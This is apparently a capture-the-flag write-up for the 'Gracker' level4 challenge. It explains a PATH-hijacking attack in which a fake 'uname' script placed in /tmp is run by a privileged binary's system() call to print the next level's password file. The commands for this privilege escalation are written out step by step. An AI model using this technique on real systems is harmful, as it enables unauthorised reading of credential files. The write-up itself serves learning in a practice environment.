It is an interesting question.
Based on the use of PATH executable command.
What we have to do is to somehow print the content of '/home/level5/.pass'.
Having a look at the level4.c we notice 'system("uname -a")' which calls the executable uname.So changing the content of uname to 'strings /home/level5/.pass' will do our job.
We cannot modify the actual uname but we can fake one.

Gracker allows creating tmp directories.
so---------
           $ mkdir /tmp
           $ cd /tmp
           $ touch uname
           $ echo "strings /home/level5/.pass" > uname
           $ chmod +x uname -----making the file executable
           
now going again to /matrix/level4, we have to make our tmp directory more prior than the directory containing the original uname file.
To do that 
	   $ PATH="/tmp:$PATH"
           $ printenv PATH ---- to verify

then simply run ./level4 to get the password.
